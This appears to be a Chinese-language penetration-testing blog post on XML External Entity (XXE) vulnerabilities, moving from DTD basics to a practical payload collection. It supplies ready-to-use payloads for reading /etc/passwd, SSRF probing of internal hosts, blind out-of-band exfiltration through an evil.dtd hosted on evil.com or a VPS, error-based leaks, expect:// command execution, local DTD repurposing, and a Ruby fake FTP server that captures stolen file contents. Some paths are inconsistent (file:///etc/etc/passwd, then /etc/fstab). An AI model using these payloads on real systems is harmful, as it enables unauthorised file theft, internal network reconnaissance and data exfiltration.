+++
date = '2026-02-04'
draft = false
title = 'XML 漏洞详解'

+++

# XML漏洞



## 理论：

xml是一种用来传输和存储数据的格式，长得有些像HTML

```
<user>
	<username>admin</username>
	<role>manager</role>
</user>
```

要学习XML就要先学习DTD

什么是DTD？

DTD（文档类型定义）使用来定义xml文档的合法结构。重点在于DTD允许定义实体也就是**Entity**，而他也就是漏洞的根源

他有些像编程语言中的变量，举两个例子

```
内部实体   
<!DOCTYPE root [
	<!ENTITY name "h4xk0r">
]>
<root>Hello &name;</root>
```

```
外部实体----这是漏洞的核心，xml允许从外部通过url或文件路径加载数据
语法关键字 SYSTEM 或 PUBLIC

<!DOCTYPE root[
	<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;<root>

如果在实际过程中后端接收了你的XML，并且解析了&xxe这个变量，那么就可以通过构造SYSTEM后面的路径，让服务器读取文件，探测内网
```

## 实战向：

### 怎么去寻找漏洞点：

显式的XML接口：

如果请求头是 `Content-Type: application/xml` 或 `text/xml`，且数据包体是 XML，那么可以直接插入payload进行测试，但是感觉现在很少了

隐式接口（content-Type欺骗）：

```
假设一个api接口是这样的：
POST /api/login HTTP/1.1
Content-Type: application/json

{"user": "admin", "pass": "123"}

很多框架为了兼容性，会根据Content-Type切换解析器，所以我们构造payload

POST /api/login HTTP/1.1
Content-Type: application/xml  <-- 修改这里

<?xml version="1.0" ?>
<user>admin</user>
<pass>123</pass>

如果这时候服务器没有报错说明支持xml格式，那么就可以构造payload测试xxe漏洞了
```

文件上传（SVG与office）--这个是比较容易被忽视的点

svg： 是一种图片格式的矢量图。微信头像，网站logo上传处

Execl/Word（.xlsx/.docx）: 本质是ZIP包，解压后是XML。 简历上传，报表导入处



### 实战payload

情况一：

有回显的文件读取，页面会直接打印出来输入的命令

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<userHeader>
  <userName>&xxe;</userName>
</userHeader>

windows用file:///c:/windows/win.ini
```

情况二：

SSRF内网探测端口或者web

```
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:80/admin">
]>
<user>&xxe;</user>
```

情况三：

盲注（OOB/Blind XXE）-- 常见

页面不返回任何内容则需要使用带外攻击（OOB），这里需要参数实体，语法用`%`而不是`&`

步骤如下：

1. vps上http://example.com下创建文件`evil.dtd`内容如下

   ```
   <!ENTITY % file SYSTEM "file:///etc/passwd">
   <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://evil.com/?data=%file;'>">
   %eval;
   ```

   (注意：`%` 是 `%` 的 HTML 转义，为了防止嵌套解析错误)

2. 发送payload (访问自己开的网站)

   ```
   <?xml version="1.0"?>
   <!DOCTYPE foo [
     <!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">
     %xxe;
     %exfiltrate;
   ]>
   <root></root>
   ```

   原理解析：

   目标去指定的位置解析去找了我们vps上的文件，加载DTD文件，读取文件存入%file，目标发送请求，我们就可以在web日志中看到敏感文件

扩展：svg图片上传payload

创建svg文件，内容如下：

```
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

查看图片上是否有水印

### 特殊技巧及绕过

##### 技巧：

1. 如果遇到php环境，有可能安装`expect`扩展，比较少见，但是成功可以直接RCE!

```
<!ENTITY xxe SYSTEM "expect://id">
```

2. Excel/Word

   解压软件手动改容易破坏文件结构，建议使用`Oxml_xxe`这种专门的工具，编辑完xml后重新打包整个目录



##### 绕过：

###### **技巧一：** php的**base64编码读取** ，为了应对读取的文件中包含特殊字符

```
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
```

###### **技巧二：** CDATA绕过

如果不能用 Base64（比如 Java 环境），读取包含 XML 特殊字符的文件会报错。可以使用 `CDATA` 包裹数据。 需要配合外部 DTD 配合，通常用于 Blind XXE 中读取复杂的配置文件（如 `web.xml`）。

具体实现方法如下：

1. vps上的web目录创建evil.dtd文件

```
<!ENTITY % start "<![CDATA[">

<!ENTITY % file SYSTEM "file:///etc/etc/passwd">

<!ENTITY % end "]]>">

<!ENTITY % all "<!ENTITY &#x26; res '%start;%file;%end;'>">
```

2. 在目标网站发送请求

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://evil.com/evil.dtd">
  
  %remote;
  
  %all;
]>
<root>&res;</root>
```

原理解析：

目标服务器读取并且解析xml，读取了dtd文件，在内存中：

- `%start;` 变成了 `<![CDATA[`
- `%file;` 变成了 `/etc/fstab` 的真实内容
- `%end;` 变成了 `]]>`

执行 `%all;` 时，它在内部定义了一个普通的文本实体 `&res;`，其值为： `<![CDATA[ ...文件内容... ]]>`

最后在 `<root>&res;</root>` 中，由于内容被 CDATA 包裹，XML 解析器会直接把它当作一段文本输出，而不会因为文件里有 `<` 符号而报错。



那这个时候又有一个问题，如果没有回显怎么办？

方法一：

报错注入，利用不完整的dtd文件诱发解析器错误，将读取到的内容显示在报错信息中，修改dtd内容如下：

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

服务器会因为找不到 `/nonexistent/root:x:0...` 这个文件而报错，而报错信息中就包含我们想要的信息

方法二：

利用FTP协议（java环境特有）

Java 的 XML 解析器支持通过 FTP 协议外带数据。由于 FTP 允许传输包含换行和特殊字符的原始数据，这种方法比 HTTP 稳定得多。

1. 使用工具（如 `ruby_ftp_server.rb`）在 VPS 启动一个模拟 FTP 监听。

2. Payload 修改为 `SYSTEM "ftp://evil.com:21/%file;"`。

   

手动复现步骤如下：

准备：需要一个能记录客户端 `RETR` 命令的“伪 FTP 服务器”

1. 在vps上启动伪FTP监听，运行脚本`.rb`

   ```
   require 'socket'
   
   server = TCPServer.new 2121 # 监听2121端口
   puts "Fake FTP server started on port 2121..."
   
   loop do
     Thread.start(server.accept) do |client|
       puts "Client connected."
       client.puts "220 Fake FTP Server Ready"
       loop do
         gets = client.gets
         puts "Received: #{gets}" # 这里会打印出包含文件内容的请求
         if gets.start_with? "USER"
           client.puts "331 Password required"
         elsif gets.start_with? "PASS"
           client.puts "230 User logged in"
         elsif gets.start_with? "RETR"
           client.puts "550 File not found" # 拒绝下载，但我们已经拿到了文件名
           break
         else
           client.puts "200 OK"
         end
       end
       client.close
     end
   end
   ```

2. 在vps上准备外部DTD文件

   ```
   <!ENTITY % file SYSTEM "file:///etc/passwd">
   <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'ftp://47.x.x.x:2121/%file;'>">
   %eval;
   %exfiltrate;
   ```

3. 发送payload

   ```
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE root [
     <!ENTITY % remote SYSTEM "http://47.x.x.x/evil.dtd">
     %remote;
   ]>
   <root>test</root>
   ```

   此时观察终端脚本的返回内容，就会返回想要的数据了



如果以上方法都不行那还有一种方法：

###### **技巧三：**DTD文件重写

原理：XML 允许在 `DOCTYPE` 中通过 `INTERNAL SUBSET`（内部子集）来重新定义已经在外部 DTD 中声明过的实体。并且解释器会优先使用我们的定义

步骤如下：

1. 寻找DTD文件（常见路径如下）

- **Linux (Ubuntu/Debian)**`/usr/share/xml/fontconfig/fonts.dtd`
- **Linux (RHEL/CentOS)**`/usr/share/sgml/docbook/xml-dtd-4.3-1.0-25.el7/ent/isogrk2.ent`
- **Windows**`C:\Windows\System32\wbem\xml\cim20.dtd`
- **Java 应用服务器**很多自带的 Jar 包里也有，如 `hibernate-mapping-3.0.dtd`

验证：发送以下payload进行尝试

```
<!DOCTYPE root SYSTEM "/usr/share/xml/fontconfig/fonts.dtd">
<root>test</root>
```

2. 构造payload

   假设我们确认目标服务器（Linux）存在 `/usr/share/xml/fontconfig/fonts.dtd` 这个文件。

   这个 `fonts.dtd` 内部定义了一个名为 `constant` 的实体。我们进行重写

   ```
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE root [
       <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
   
       <!ENTITY % constant '
           <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
           <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
           &#x25;eval;
           &#x25;error;
       '>
   
       %local_dtd;
   ]>
   <root>test</root>
   ```

   注意细节：

   **三重转义**：注意 `&#x25;`。这是因为我们在实体内部定义实体，又在嵌套内定义报错实体。每一层解析都需要多一重转义，否则 XML 解析器在第一层就会“炸掉”。

   **引号问题**：最外层用单引号 `'`，内部用双引号 `"`。

